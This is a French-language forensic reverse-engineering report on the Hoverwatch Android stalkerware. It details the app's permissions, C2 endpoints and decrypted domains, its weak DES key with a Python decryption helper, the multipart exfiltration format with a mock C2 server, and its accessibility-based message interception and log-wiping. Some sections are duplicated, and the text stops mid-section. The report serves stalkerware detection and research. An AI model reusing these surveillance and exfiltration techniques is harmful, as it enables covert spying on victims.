# Hoverwatch v7.5.369 — Analyse complète

> **Package** : `com.android.core.mntan`
> **Version** : 7.5.369 (versionCode 369)
> **Target SDK** : 33 (Android 13)
> **Min SDK** : 19 (Android 4.4)
> **Obfuscation** : ProGuard/R8 — package renommé `p094hw` (hw = Hoverwatch)
> **Application** : `com.utils.core.CoreApplication`
> **Éditeur** : Refog Inc. (cf. §16)
> **Multi-brand** : même codebase que Snoopza v6.5.83 — cf. §16
> **Code natif** : aucun (0 méthode `native`, confirmé DexDispatch)
> **Outil** : JADX MCP + DexDispatch

> **Révisions** :
> - v1 — 2026-04-08 : analyse statique complète initiale
> - v2 — 2026-04-20 (matin) : attribution Refog + pivot multi-brand Snoopza + correction clé DES + domaines C2 seedés binaires décryptés
> - v3 — 2026-04-20 (après-midi) : décryption batch des 13 strings DES (canary `"refog"` in-binary, YouTube Kids caché), kill switch `C0744c`, format exfil multipart Apache HttpClient (PAS protobuf), schéma BDD IM `mpk_events`, flow `ActivityInstaller` (11 fragments / 18 modules togglables), correction confusion `user_type` JSON vs brand code URL

---

## 1. Manifest — Permissions

### 1.1 Permissions de surveillance (19)

| Permission | Usage |
|------------|-------|
| `RECEIVE_SMS` / `READ_SMS` | Interception SMS |
| `READ_CALL_LOG` / `WRITE_CALL_LOG` / `PROCESS_OUTGOING_CALLS` | Journal d'appels |
| `READ_CONTACTS` | Contacts |
| `READ_CALENDAR` | Calendrier |
| `ACCESS_FINE_LOCATION` / `ACCESS_COARSE_LOCATION` / `ACCESS_BACKGROUND_LOCATION` | Géolocalisation (y compris background) |
| `READ_PHONE_STATE` / `READ_PHONE_NUMBERS` / `READ_PRIVILEGED_PHONE_STATE` | Identifiants téléphone (IMEI, numéro) |
| `RECORD_AUDIO` / `MODIFY_AUDIO_SETTINGS` | Enregistrement micro |
| `CAMERA` | Photos |
| `READ_EXTERNAL_STORAGE` / `WRITE_EXTERNAL_STORAGE` / `MANAGE_EXTERNAL_STORAGE` | Fichiers |
| `READ_LOGS` | Logs système |
| `GET_ACCOUNTS` | Comptes utilisateur |
| `READ_HISTORY_BOOKMARKS` | Historique navigateur |
| `PACKAGE_USAGE_STATS` | Apps utilisées |

### 1.2 Permissions de furtivité (stealth)

| Permission | Usage |
|------------|-------|
| `SYSTEM_ALERT_WINDOW` | Overlay (masquer l'app) |
| `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` | Empêcher l'arrêt par le système |
| `FOREGROUND_SERVICE` | Service persistant |
| `RECEIVE_BOOT_COMPLETED` | Survie au redémarrage |
| `WAKE_LOCK` | Maintien du processeur actif |
| `REQUEST_INSTALL_PACKAGES` / `REQUEST_DELETE_PACKAGES` | Auto-update / auto-suppression |
| `QUERY_ALL_PACKAGES` | Lister toutes les apps installées |
| `INTERACT_ACROSS_USERS` / `INTERACT_ACROSS_USERS_FULL` | Multi-profil (nécessite signature) |

---

## 2. Architecture — Composants

### 2.1 Services

| Classe | Rôle | Détails |
|--------|------|---------|
| `p094hw.utils.ServiceCore` | Orchestration | foregroundServiceType=location |
| `p094hw.recorder.ServiceRecording` | Enregistrement audio | process `:r` séparé |
| `p094hw.utils.ServiceScr` | Capture écran | foregroundServiceType=mediaProjection |
| `p094hw.imreader.ReaderAccessibilityService` | Interception IM | AccessibilityService |
| `p094hw.imreader.ReaderNotificationService` | Lecture notifications | NotificationListenerService |

### 2.2 Receivers

| Classe | Trigger | Rôle |
|--------|---------|------|
| `ReceiverBoot` | `BOOT_COMPLETED` (priority=100) | Redémarrage auto |
| `ReceiverOutgoingCall` | `NEW_OUTGOING_CALL` / `PHONE_STATE` | Interception appels |
| `ReceiverChangeConnection` | `CONNECTIVITY_CHANGE` / `WIFI_STATE_CHANGED` | Trigger sync réseau |
| `ReceiverUserPresent` | `USER_PRESENT` + lockscreen tiers | Détection déverrouillage |
| `ReceiverPowerEvents` | Événements batterie | Monitoring batterie |
| `ReceiverAirplaneMode` | `AIRPLANE_MODE` | Détection mode avion |
| `ReceiverAlarm` | Alarmes périodiques | Tâches planifiées |
| `ReceiverMsg` | Messages internes | Communication inter-services |

### 2.3 Activities

| Classe | Rôle |
|--------|------|
| `ActivityMainStarter` | Launcher principal (excludeFromRecents=true) |
| `ActivityDblStarter` | Double launcher (icône alternative) |
| `ActivityMain` | Interface de contrôle |
| `ActivityTrScr` | Activité transparente (overlay furtif, singleInstance, noHistory) |
| `ActivityInstaller` | Assistant installation/configuration |
| `ActivityWidget` | Widget anodin (point d'accès caché) |

**Notes** :
- `excludeFromRecents="true"` sur toutes les activités → invisible dans les apps récentes
- Process séparé `:r` pour l'enregistrement audio → survie indépendante

---

## 3. Protocole C2 — Classe `p092e.p093a.C0736a`

### 3.1 Identification client

⚠ **Correction v3** : il y a deux concepts distincts qui étaient confondus dans v1/v2 :
- Le **brand code** (`HWA`/`SNPA`/`HWA_TST`) inséré dans le **path URL** (ex: `api/online/programversion/HWA/`)
- Le **`user_type`** (entier 0-3) inséré dans le **JSON de registration** (sélectionné par l'acheteur dans `FragmentInstallMonitorType`)

| Champ | Valeur | Source |
|-------|--------|--------|
| User-Agent | `Android Monitor 7.5.369` (générique, non-brandé) | hardcodé |
| **Brand code** (path URL, header) | `HWA` (Hoverwatch prod), `HWA_TST` (test), `SNPA` (Snoopza prod) | static init `C0737a.f5124e` |
| **`user_type`** (JSON registration) | entier 0-3 : `CHILD_DEVICE`/`EMPLOYEE_DEVICE`/`OWN_DEVICE`/`UNDEFINED_DEVICE` | enum `C0867b0.a`, sélection runtime via UI installer |
| Auth header | `x-auth-key: {ActivationID}` | SharedPref (DES) |
| Settings header | `x-settings-ver: {version}` | SharedPref |
| Event header | `x-client-event: {event_data}` | runtime |

Le ternaire `f5124e` dans le static init de `C0737a` (`e.a.a`) — identique bit-à-bit dans Hoverwatch et Snoopza — sélectionne le **brand code** au build time :

```java
f5124e = C0870b0.f6028x ? "SNPA" : C0870b0.f6025u ? "HWA_TST" : "HWA";
```

Le flag `f6028x` est une constante `final static` positionnée par le build variant Gradle. Pas flippable au runtime sans repatch du DEX. Voir §16 pour l'attribution et la preuve par binary diff avec Snoopza.

### 3.2 Endpoints API

| Endpoint | Méthode | Auth | Usage |
|----------|---------|------|-------|
| `api/online/registration/` | POST (JSON) | Non | Enregistrement device |
| `api/online/activation/` | POST (JSON) | Non | Activation licence |
| `api/online/check/` | POST | Non | Ping / vérification domaine |
| `api/online/programversion/{HWA\|SNPA\|HWA_TST}/` | GET | Non | Vérification mise à jour (brand code dans path) |
| `api/online/deregistration/` | POST | Oui | Reset licence |
| `api/online/exceptionlog/` | POST (multipart) | Oui | Envoi logs d'erreurs (cf. §6.5) |
| `api/online/logs/` | POST (multipart) | Oui | **Exfiltration données collectées** (cf. §6.5) |

⚠ **Correction v3** : `exceptionlog` et `logs` étaient marqués "protobuf" en v1/v2. C'est faux — c'est du `multipart/form-data` Apache HttpClient. Cf. §6.5.

### 3.3 Registration — Données envoyées

```json
{
  "username": "<email_acheteur>",
  "password": "<password_acheteur>",
  "hid": "and:<device_hardware_id>",
  "device_name": "<modele_telephone>",
  "client_ver": "7.5.369",
  "os_ver": "<android_version>",
  "user_type": 0,    // 0=CHILD, 1=EMPLOYEE, 2=OWN, 3=UNDEFINED — enum C0867b0.a, choisi via FragmentInstallMonitorType
  "device.dev_mac_adr_str": "<mac_wifi>",
  "device.dev_mac2_adr_str": "<mac_secondaire>",
  "device.dev_serial_num_str": "<serial>",
  "device.dev_imei_str": "<imei>",
  "device.dev_accounts_str": "<comptes_google>",
  "device.perm_118": "<état_permission>",
  "device.perm_121": "<état_permission>",
  "device.perm_116": "<état_permission>",
  "device.perm_101": "<état_permission>",
  "device.perm_102": "<état_permission>",
  "device.perm_103": "<état_permission>",
  "device.perm_129": "<état_permission>",
  "device.perm_130": "<état_permission>",
  "device.perm_128": "<état_permission>"
}
```

### 3.4 Registration — Réponse serveur

```json
{
  "status": "ok",
  "auth_key": "<activation_id>",
  "valid_through": "2026-12-31 23:59:59",
  "subscription": "<type_abonnement>",
  "domains": "https://domain1.com:443/;https://domain2.com:443/",
  "client_pin": "<code_pin>"
}
```

### 3.5 Codes de réponse HTTP

| Code | Signification | Action client |
|------|---------------|---------------|
| 200 | OK | Continue |
| 400 | Request unrecognized | Erreur |
| 401 | License locked | Augmente période sync à 720 min |
| 403 | Wrong login/pass | Erreur |
| 404 | Update not found | Ignoré |
| 409 | License limit | Erreur |
| **410** | **Remove application** | **Auto-désinstallation (kill switch)** |
| 413 | Request entity too large | Erreur |
| 422 | Unprocessable Entity | Erreur |
| 500 | Server error | Erreur |
| 502 | Bad Gateway | Erreur |

### 3.6 Gestion des domaines C2

- Format : `https://domain1.com:443/;https://domain2.com:443/;https://domain3.com:443/`
- **Rotation automatique** : en cas d'échec, domaine déplacé en fin de liste
- **Mise à jour dynamique** : le serveur envoie de nouveaux domaines via registration/activation
- Normalisation forcée : ajout `https://` et `:443/` si absents
- Fallback : si domaine échoue pendant >3h, rotation vers le suivant

### 3.6.1 Seed initial in-binary (découvert v2)

Le premier trio de domaines C2 est **shipped dans l'APK** sous forme de blob DES/ECB base64, et seedé dans les SharedPreferences `domains` lors du premier run ou après upgrade de version. Localisation : `p053c.p077c.p081d.C0624b.mo4063f()` (TskInit) :

```java
C0892z.m6635w0(
    C0867b0.f5991x                                   // flag SNPA ?
        ? C0874h.m6237c("O4MkUWSy2w8l+q9I…")          // blob Snoopza
        : C0874h.m6237c("O4MkUWSy2w/J0RDF…")          // blob Hoverwatch
);
```

Chaque APK embarque **les deux blobs côte-à-côte**, seul le flag `f5991x` (build variant) détermine lequel est utilisé. Le seed a lieu uniquement si `strVersionStockée < versionActuelle` — donc **chaque upgrade reseed les domaines**, ce qui permet à Refog de pivoter son infra C2 en poussant un nouveau build.

### 3.6.2 Domaines C2 décryptés

Clé DES/ECB : `vallengt` (8 bytes, cf. §5.2). Résultats :

**Hoverwatch (`HWA`)** :
```
https://a.syncvch.com:443/
https://i1.hoverwatch.com:443/
https://hwa.cab:443/
```

**Snoopza (`SNPA`)** :
```
https://snsync.com:443/
https://api.snoopza.com:443/
https://app.snoopza.com:443/
```

Observations :
- Pattern parallèle strict : domaine stealth non-brandé + api.brand.com + app.brand.com (ou équivalent court)
- Domaines stealth (`syncvch.com`, `snsync.com`) = anti-détection DNS (pas de brand visible dans le nom)
- TLD `.cab` pour `hwa.cab` : peu coûteux, peu surveillé — typique stalkerware/phishing kits
- **Backends séparés par brand** (pas de C2 mutualisé) → isolation pour risque légal / breach containment

### 3.6.3 Nouveaux IOCs vs AssoEchap/stalkerware-indicators

| Domaine | AssoEchap | Brand | Statut |
|---|---|---|---|
| `a.syncvch.com` | ❌ | Hoverwatch | **Nouveau** |
| `hwa.cab` | ❌ | Hoverwatch | **Nouveau** |
| `i1.hoverwatch.com` | ⚠️ partiel (`hoverwatch.com` listé) | Hoverwatch | Sous-domaine non listé |
| `snsync.com` | ❌ | Snoopza | **Nouveau** |
| `app.snoopza.com` | ❌ | Snoopza | Sous-domaine non listé |
| `api.snoopza.com` | ⚠️ partiel (`snoopza.com` listé) | Snoopza | Sous-domaine non listé |

→ **PR à proposer upstream chez AssoEchap.**

---

## 4. Sécurité SSL — Classe `p092e.p093a.C0739d`

**AUCUNE** vérification SSL :

```java
// TrustManager — accepte TOUT
public void checkClientTrusted(X509Certificate[] chain, String type) { }
public void checkServerTrusted(X509Certificate[] chain, String type) { }
public X509Certificate[] getAcceptedIssuers() { return null; }

// HostnameVerifier — accepte TOUT
public boolean verify(String hostname, SSLSession session) { return true; }
```

→ Vulnérable au MITM, tout proxy peut intercepter le trafic C2

---

## 5. Chiffrement — Classe `p094hw.utils.C0870h`

### 5.1 Algorithme

**DES en mode ECB** avec PKCS5Padding — pas de IV, pas de chaînage.

```java
// p094hw.utils.C0874h.m6239e (équivalent C0870h dans première analyse)
private static String m6239e(String key, String b64, int flags) {
    if (key.length() < 8) {
        key = key + "length 8";            // padding fixe hardcodé
    }
    SecretKey secretKey = SecretKeyFactory.getInstance("DES")
        .generateSecret(new DESKeySpec(key.getBytes(UTF_8)));
    // DESKeySpec ne garde que les 8 PREMIERS bytes
    Cipher cipher = Cipher.getInstance("DES");  // = DES/ECB/PKCS5Padding
    cipher.init(DECRYPT_MODE, secretKey);
    return new String(cipher.doFinal(Base64.decode(b64, flags)));
}
```

### 5.2 Clé effective (⚠ corrigé v2)

| Étape | Valeur |
|-------|--------|
| Clé passée par le wrapper | `"val"` (3 chars) |
| Padding (length < 8) | `"val" + "length 8"` = `"vallength 8"` (11 chars) |
| DESKeySpec garde 8 premiers bytes UTF-8 | **`"vallengt"`** (= `0x76 0x61 0x6C 0x6C 0x65 0x6E 0x67 0x74`) |

La **vraie clé DES est `vallengt`** — pas `vallength` ni `vallenge` (erreurs précédentes). Usage :
- SharedPreferences chiffrées (ActivationID, Password, domains, Subscription)
- Blobs de domaines C2 seedés dans le binaire (cf. §3.6.1)
- Strings obfusquées dans le code

### 5.3 Déchiffrement forensique

```python
# uv add pycryptodome
from Crypto.Cipher import DES
from Crypto.Util.Padding import unpad
from base64 import b64decode

KEY = b"vallengt"  # 8 bytes — clé effective après padding "length 8" + troncature DESKeySpec

def decrypt_hw(b64: str) -> str:
    cipher = DES.new(KEY, DES.MODE_ECB)
    pt = cipher.decrypt(b64decode(b64))
    return unpad(pt, 8).decode()

# Exemple : blob des domaines C2 par défaut (branche HWA dans C0624b)
blob_hwa = "O4MkUWSy2w/J0RDFuayF5Ews4PV4Ocp8zP7SC0Tqr8tNqvR67gt5eLENzuZr371ILX3yaN+WuMUV\n3d5sswyBFBNI5FtH3kiMb/0dsnsdKtY="
print(decrypt_hw(blob_hwa))
# → https://a.syncvch.com:443/;https://i1.hoverwatch.com:443/;https://hwa.cab:443/
```

**Known-plaintext helper** : les blobs commencent toujours par `https://` (8 chars = 1 bloc DES) → utile pour valider rapidement la clé sans avoir à décoder PKCS5.

### 5.4 Vulnérabilités cryptographiques

1. **DES** — cassé depuis 1998 (56 bits)
2. **ECB** — patterns visibles dans le chiffré
3. **Clé `"val"` hardcodée** → tout est déchiffrable
4. **Pas de IV** → même plaintext = même ciphertext
5. **Pas de MAC/HMAC** → modification silencieuse possible

### 5.5 Décryption batch des strings obfusquées (v3)

13 blobs DES identifiés dans le code via `search_method_by_name("m6237c")` (7 classes call sites). Décryption batch via `decrypt_strings.py` (clé `vallengt`) :

| Call site | Plaintext | Catégorie |
|---|---|---|
| `C0867b0.f5968a` | `content://` | Préfixe URI ContentProvider |
| `C0612a.f4614b` | `/history` | Suffix scrape historique browser |
| `C0612a.f4615c` | `/bookmarks` | Suffix scrape bookmarks browser |
| `C0626d` browser cat=201 #1 | `com.google.android.youtube` | App cible cachée |
| `C0626d` browser cat=201 #2 | `com.google.android.apps.youtube.kids` | **App cible cachée — RED FLAG IPV** |
| `C0626d` browser cat=205 | `com.facebook.katana` | App cible cachée |
| **`C0737a.<clinit>`** | **`refog`** | **Canary d'attribution in-binary** |
| `C0624b` HWA blob | `https://a.syncvch.com:443/;https://i1.hoverwatch.com:443/;https://hwa.cab:443/` | Seed C2 Hoverwatch |
| `C0624b` SNPA blob | `https://snsync.com:443/;https://api.snoopza.com:443/;https://app.snoopza.com:443/` | Seed C2 Snoopza |
| `C0878l$a` cmd | `logcat` | Crash log scraping (cf. §21) |
| `C0878l$a` args | `-d -v time -b crash` | Crash log scraping |
| `C0878l$a` filter | `E/AndroidRuntime` | Filter Java crashes |
| `C0878l$a` clear | `-c` | **Anti-forensics : efface les logs** |

**3 findings critiques** :

1. **Canary `"refog"`** dans le static init de la classe HTTP (`C0737a`) — le résultat de `C0874h.m6237c("uHpzgHJIA7s=")` n'est pas assigné, c'est un **call à effet de bord** dont la valeur est jetée. Sa seule raison d'être : laisser une preuve d'attribution dans le binaire chiffré. Signature **forte pour rule YARA / signature statique** : tout APK contenant ce blob déchiffrable en `"refog"` appartient à l'écosystème Refog Inc.

2. **YouTube Kids caché spécifiquement par chiffrement DES** parmi ~60 apps de surveillance dont la grande majorité sont en clair. Les opérateurs savent que tracker une app pour enfants déclenche les scanners automatiques Play Protect / outils de classification stalkerware → ils l'obfusquent. **Angle IPV publiable dans le SoK** : preuve que les éditeurs ont conscience du scope de surveillance enfants et tentent activement de le dissimuler.

3. **Anti-forensics actif sur logs Android** : `logcat -c` exécuté côté victime pour effacer les logs système après extraction. Branche dormante sur Android non-rooté (READ_LOGS = signature-level depuis 4.1) mais **active sur OEM partners / devices custom-firmware**. Cf. §21.

1. **DES** — cassé depuis 1998 (56 bits)
2. **ECB** — patterns visibles dans le chiffré
3. **Clé `"val"` hardcodée** → tout est déchiffrable
4. **Pas de IV** → même plaintext = même ciphertext
5. **Pas de MAC/HMAC** → modification silencieuse possible

---

## 6. Collecteurs de données

### 6.1 Architecture d'exfiltration

```
Collecteurs (Services/Receivers/ContentObservers)
    ↓ écriture
Base de données SQLite locale (mpk_events, AbstractC0747c / AbstractC0749e)
    ↓ lecture batch
Multipart/form-data builder (Apache HttpClient — p082d.p083a.p084a.p085a = d.a.a.a)
    ↓ POST HTTPS (TrustAll)
C2 server (api/online/logs/)
```

⚠ **Correction v3** : le package `p082d.p083a.p084a.p085a` (= `d.a.a.a` dans le DEX) **n'est pas un sérialiseur protobuf custom** — c'est **Apache HttpComponents** (probablement `cz.msebera.android.httpclient`). La classe `C0707b` est `org.apache.http.entity.ContentType` (constantes statiques `application/json`, `multipart/form-data`, etc.) et `C0719k` est `MultipartEntityBuilder` (signatures `create()`, `addTextBody`, `addBinaryBody`, `build()`). Les logs sont du **HTTP multipart standard**, trivial à mocker.

### 6.2 Liste des collecteurs

| ID | Nom | Classe | Données |
|----|-----|--------|---------|
| 302 | Screenshots | `p053c.p077c.p079b.C0611d` | Captures d'écran périodiques (JPEG qualité 40%) |
| 304 | IM Reader | `p053c.p077c.p081d.C0626d` | Messages IM via AccessibilityService (100+ apps) |
| 305 | Browser | `p053c.p077c.p081d.C0626d` | URLs visitées (44+ navigateurs) |
| 312 | Call Recording | `p094hw.recorder.ServiceRecording` / `C0856j` | Enregistrements audio/appels |
| 313 | SMS | `p053c.p077c.p081d.C0626d` | SMS via Google Messages + apps dynamiques |
| 314 | Location | `p053c.p077c.p080c.C0616e` | GPS + WiFi BSSID + Cell ID |
| 319 | Front Camera | config `frcam` | **Photos silencieuses caméra frontale** |
| — | Keylogger | config `keys` | **Frappes clavier via AccessibilityService** |
| — | Contacts | `C0747d` (ContentObserver) / config `contact` | Contacts via ContentProvider |
| — | Call Log | `C0747d` (ContentObserver) | Journal d'appels via ContentProvider |
| — | Calendar | `C0747d` (ContentObserver) / config `calendar` | Événements calendrier |
| — | SIM Monitor | config `sim` | Monitoring changement de carte SIM |
| — | Files Monitor | config `files` | Monitoring fichiers (photos, documents) |
| — | App Usage | config `app` | Applications installées/lancées |

### 6.3 Flux de synchronisation (`m5329C`)

1. Vérification : licence valide + réseau dispo + délai respecté
2. Si WiFi : acquisition `WifiLock` pour maintenir la connexion
3. Ping serveur (`api/online/check/`)
4. Parse settings serveur (header `x-settings-ver`)
5. Envoi exception logs (`api/online/exceptionlog/`)
6. Envoi event logs (`api/online/logs/`)
7. Envoi données de chaque collecteur (`AbstractC0746c.m5458p()`)
8. Update timestamp `SyncServerLastTime`

### 6.5 Format exfiltration multipart (v3)

Les endpoints `api/online/logs/` et `api/online/exceptionlog/` reçoivent du `multipart/form-data` HTTP standard construit via `MultipartEntityBuilder` (Apache HttpClient).

**Naming des parts** (méthode `C0881o.m6334X`) :
```java
public static String m6334X(boolean z, int i) {
    return z ? String.format(Locale.ENGLISH, "exception%04d", i)
             : String.format(Locale.ENGLISH, "log%04d", i);
}
```

→ Parts nommées `log0001`, `log0002`, ..., `log9999` (ou `exception0001`, etc.). Content-Type par part = `application/json` (`C0707b.f5065e`).

**Format du body brut** :
```http
POST /api/online/logs/ HTTP/1.1
Host: a.syncvch.com
Content-Type: multipart/form-data; boundary=XXXXX
X-Auth-Key: <ActivationID>
X-Settings-Ver: 1
X-Client-Event: <event_data>

------XXXXX
Content-Disposition: form-data; name="log0001"
Content-Type: application/json; charset=UTF-8

{"cat": 1, "crd": [48.8566, 2.3522], "acc": 15.0, ...}
------XXXXX
Content-Disposition: form-data; name="log0002"
Content-Type: application/json; charset=UTF-8

{...}
------XXXXX--
```

**Mock C2 server FastAPI** :
```python
from fastapi import FastAPI, Request
app = FastAPI()

@app.post("/api/online/logs/")
async def logs(request: Request):
    form = await request.form()
    auth = request.headers.get("x-auth-key")
    for name, content in form.items():
        if name.startswith("log"):     # log0001, log0002, ...
            idx = int(name[3:])
            payload = await content.read() if hasattr(content, "read") else content
            print(f"[{auth}] log #{idx}: {payload[:200]}")
    return {"status": "ok"}
```

Pas de besoin de protobuf, pas de schéma à reverser. Format auto-décodable par n'importe quel proxy MITM (ex: mitmproxy intercepte les parts directement).

### 6.4 Configuration distante — Classe `p094hw.utils.C0887y`

Le serveur C2 contrôle chaque module à distance via un objet `settings` envoyé dans la réponse registration/activation. Config par défaut hardcodée dans `m6527x()` :

```json
{
  "settings": {
    "version": 1,
    "on": true,
    "debug": false,
    "onlyWiFi": false,
    "period": 10,
    "autoupdate": { "on": false },
    "location": { "on": true, "period": 10, "acc": 1000 },
    "contact": { "on": true },
    "call": { "on": true, "rec": true, "source": 4, "quality": 1, "codec": 2, "gain": false },
    "sms": { "on": true, "shot": false },
    "chat": { "on": true, "shot": false, "rec": true },
    "url": { "on": true, "shot": false },
    "sim": { "on": false },
    "calendar": { "on": true },
    "frcam": { "on": true, "photo": true },
    "shot": { "on": false, "period": 5 },
    "files": { "on": true, "shot": false },
    "app": { "on": true, "shot": false },
    "keys": { "on": true, "shot": false }
  }
}
```

Chaque module supporte :
- `on` — activer/désactiver le module
- `shot` — déclencher un screenshot sur événement
- `rec` — déclencher un enregistrement audio sur événement (chat, appels VoIP)

Paramètres audio (`call`) :
- `source` — AudioSource Android : 1=MIC, 4=VOICE_COMMUNICATION (défaut), 6=VOICE_RECOGNITION, 7=VOICE_CALL. Adaptation par fabricant : Samsung→7, Huawei→6
- `quality` — 0=basse, 1=moyenne (défaut), 2=haute
- `codec` — codec d'encodage (défaut=2)
- `gain` — amplification du gain audio (activé par défaut sur Android ≥ 28)

Paramètres localisation :
- `period` — intervalle de collecte en minutes (défaut=10)
- `acc` — précision minimum en mètres (défaut=1500)

Paramètres screenshots :
- `period` — intervalle en minutes (défaut=5)

**Implication critique** : l'acheteur/abuseur peut activer à distance le keylogger, la caméra frontale, les screenshots, et l'enregistrement audio depuis le portail web Hoverwatch.

---

## 7. Enregistrement audio — `p094hw.recorder.ServiceRecording`

- **Process séparé** (`:r`) → survit à l'arrêt du service principal
- Deux slots : `C0846c(10)` (10 min max) et `C0846c(300)` (5h max)
- Trois modes : `OFFHOOK` (détection appel), `RECORD` (enregistrement), `STOP`
- **Views invisibles** (`LinearLayout` ajoutées au `WindowManager`) pour empêcher Android de tuer le service
- Notification foreground avec ID `110111` → invisible
- Détection auto des appels VoIP via AccessibilityService (WhatsApp, etc.)

---

## 8. Capture d'écran — `p053c.p077c.p079b.C0611d`

- **MediaProjection** + `VirtualDisplay` + `ImageReader`
- Compression JPEG **qualité 40%** (faible poids → exfiltration rapide)
- Max **5 captures par session**
- Relancé toutes les **24h** via `ReceiverAlarm`
- **Android < 30 uniquement** (restrictions Google depuis Android 11)
- VirtualDisplay nommé `"Second-screen"` (tente de passer inaperçu)
- Permission obtenue une fois via `ScreenshotCheckerActivity` puis réutilisée via `PendingIntent`

---

## 9. Interception IM — `p094hw.imreader.ReaderAccessibilityService`

### 9.1 Mécanisme

Utilise l'**AccessibilityService** pour parser l'arbre d'accessibilité des apps cibles. Pour chaque app, un parser dédié (ex: `C0776p` pour WhatsApp) navigue dans les `AccessibilityNodeInfo` en utilisant les **resource IDs** des éléments UI :

```
com.whatsapp:id/conversations_row_contact_name → nom du contact
com.whatsapp:id/conversation_contact_name → nom dans la conv
com.whatsapp:id/conversation_root_layout → layout racine
com.whatsapp:id/date → horodatage
com.whatsapp:id/thumb → média thumbnail
com.whatsapp:id/sticker_image → stickers
com.whatsapp:id/call_screen → détection appel
com.whatsapp:id/ringing_dots → appel sortant
com.whatsapp:id/toggle_video_btn → appel vidéo
```

### 9.2 Données interceptées

Structure `InstantMessage` :
- `_time_stamp` — horodatage du message
- `_seen_time` — quand le message a été vu
- `_from` — expéditeur
- `_msg_text` — contenu textuel
- `_msg_type` — type (texte=0, image=1, sticker=5, vidéo=6)
- `_direction` — `INBOUND` / `OUTBOUND`
- `_index` — index dans la conversation

### 9.5 Schéma BDD messages IM (v3) — Classe `p094hw.database.C0752h` (équiv. `C0751h` Hoverwatch)

CREATE TABLE extrait de la méthode `mo4669A()` :

```sql
CREATE TABLE IF NOT EXISTS mpk_events (
    _id    INTEGER PRIMARY KEY AUTOINCREMENT,
    uuid   VARCHAR NOT NULL,                 -- identifiant unique du message
    status INTEGER DEFAULT '0' NOT NULL,     -- 0=à envoyer, 1=envoyé
    time   INTEGER DEFAULT '-1' NOT NULL,    -- timestamp du message (ms epoch)
    im     INTEGER NOT NULL,                 -- code app (1=?, 4, 5, 6, 7, 9, 11, 13, 31)
    cat    INTEGER DEFAULT '-1' NOT NULL,    -- catégorie (direction in/out/seen)
    name   VARCHAR,                          -- nom du contact / chat
    chat   VARCHAR,                          -- nom du groupe si applicable
    me     VARCHAR,                          -- identifiant user local
    res    VARCHAR,                          -- resource (attachement, thumbnail)
    link   VARCHAR,                          -- URL
    data   VARCHAR                           -- contenu textuel
);
```

**Structure runtime — classe `C0752h.i` (un message en mémoire)** :

| Field | Nom logique | Type | Description |
|---|---|---|---|
| `f5247a` | `im` | int | Code de l'app (1, 4, 5, 6, 7, 9, 11, 13, 31, ...) |
| `f5248b` | `cnt` | String | Identifiant conversation |
| `f5249c` | `time` | long | Timestamp envoi/réception |
| `f5250d` | `seen_time` | long | Timestamp vu |
| `f5251e` | `direction` | int | 1=inbound, 2=outbound, 3=seen |
| `f5252f` | `msg_text` | String | Contenu texte |
| `f5253g` | `data_clean` | String | Texte nettoyé (lazy) |
| `f5254h` | `from` | String | Expéditeur |
| `f5255i` | `msg_type` | int | 1=sticker, 2=image, 4=video, 5=audio, 6=document |
| `f5256j` | `attachments` | Object[] | `(File, mimetype, width)` |

**Codes `msg_type` (placeholders via `m5503b0`)** :
```
type=1 → "<sticker>"
type=2 → "<image>"
type=3 → <ressource 5279d>
type=4 → "<video>"
type=5 → "<audio>"
type=6 → "<document>"
```

**Comportements opérationnels** :

- **Rétention max 300 msgs / conv / app** — au-delà, les plus anciens sont purgés (`SELECT WHERE im=? AND name=? ORDER BY time ASC` + `DELETE` du surplus)
- **Dédup temporelle** : deux messages avec mêmes `(im, name, data, cat)` dans une fenêtre temporelle sont considérés duplicates. Fenêtre par `im` :
  - `im=1` ou `im=31` → 60 secondes
  - `im=4, 5, 6, 7, 9, 11, 13` → 180 secondes
  - autres → 120 secondes (fallback)
- **Alarme périodique** : `f5228m = "C_A_M_" + deviceId + (SNPA ? "-S" : "")` → `ReceiverAlarm` traite la queue toutes les 60 secondes
- **Gestion attachments** : si un message a un fichier joint (image/vidéo/audio/document), il est copié dans le dossier du collecteur (`f5204b`) et tracé via uuid. Limite taille : 200 MB par fichier (`209715200` bytes)
- **Le nom de table `mpk_events` est partagé** entre plusieurs collecteurs (location, IM, contacts, etc.) — chaque collecteur a sa propre DB SQLite dans un fichier séparé

### 9.3 Parsers IM identifiés

| Classe | App | Package |
|--------|-----|---------|
| `C0776p` | WhatsApp | `com.whatsapp` |
| `C0764d` | Facebook Messenger | `com.facebook.orca` |
| `C0769i` | Instagram | `com.instagram.android` |
| `C0765e` | Viber | `com.viber.voip` |
| `C0766f` | Telegram | `org.telegram.messenger` |
| `C0771k` | Skype | `com.skype.raider` |
| `C0773m` | Snapchat | `com.snapchat.android` |
| `C0774n` | LINE | `jp.naver.line.android` |
| `C0775o` | KakaoTalk | `com.kakao.talk` |
| `C0762b` | Générique | Autres apps |

### 9.4 Interception des appels VoIP

Le parser WhatsApp détecte aussi les appels VoIP :
- `accept_incoming_call_view` → appel entrant accepté
- `ringing_dots` → appel sortant en cours
- `toggle_video_btn` → bascule audio/vidéo
- `participant_list` → participants (appels de groupe)
- `surface_view` → flux vidéo détecté

### 9.5 Schéma BDD `mpk_events` — données volées par message (v2)

**Source** : `p094hw.database.C0752h.mo4669A()` (équivalent `C0751h` dans Hoverwatch). Tag log = `"ImOb"` (IM Observer), module ID **304**.

La BDD locale SQLite stocke chaque événement IM (message, média, appel) dans **une table unique `mpk_events`** avant exfiltration vers le C2.

#### 9.5.1 Schéma SQL

```sql
CREATE TABLE IF NOT EXISTS mpk_events (
    _id    INTEGER PRIMARY KEY AUTOINCREMENT,
    uuid   VARCHAR NOT NULL,              -- timestamp formatté (clé de dédup globale)
    status INTEGER DEFAULT '0' NOT NULL,  -- 0 = en attente d'exfil, 1 = envoyé au C2
    time   INTEGER DEFAULT '-1' NOT NULL, -- timestamp original du message (ms epoch)
    im     INTEGER NOT NULL,              -- ID de l'app source (cf. table 9.5.3)
    cat    INTEGER DEFAULT '-1' NOT NULL, -- direction (cf. enum MESSAGE_DIRECTION)
    name   VARCHAR,                       -- nom du contact (interlocuteur)
    chat   VARCHAR,                       -- nom du chat/groupe
    me     VARCHAR,                       -- compte utilisé par la VICTIME
    res    VARCHAR,                       -- nom du fichier joint copié localement
    link   VARCHAR,                       -- URL externe (média partagé, etc.)
    data   VARCHAR                        -- CONTENU TEXTUEL du message (clair)
);
```

**Champs sensibles forensiquement** :
